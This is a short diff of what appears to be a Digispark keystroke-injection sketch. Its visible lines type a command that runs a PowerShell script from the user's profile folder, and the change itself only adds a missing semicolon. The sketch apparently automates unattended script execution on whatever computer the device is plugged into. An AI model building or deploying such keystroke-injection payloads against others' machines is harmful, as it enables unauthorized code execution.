@@ -30,6 +30,6 @@ void loop() {
 
   DigiKeyboard.println("powershell.exe -File \"%USERPROFILE%\\script2.ps1\"");
   DigiKeyboard.delay(4000);
-  DigiKeyboard.println("exit")
+  DigiKeyboard.println("exit");
   for(;;){} 
 }
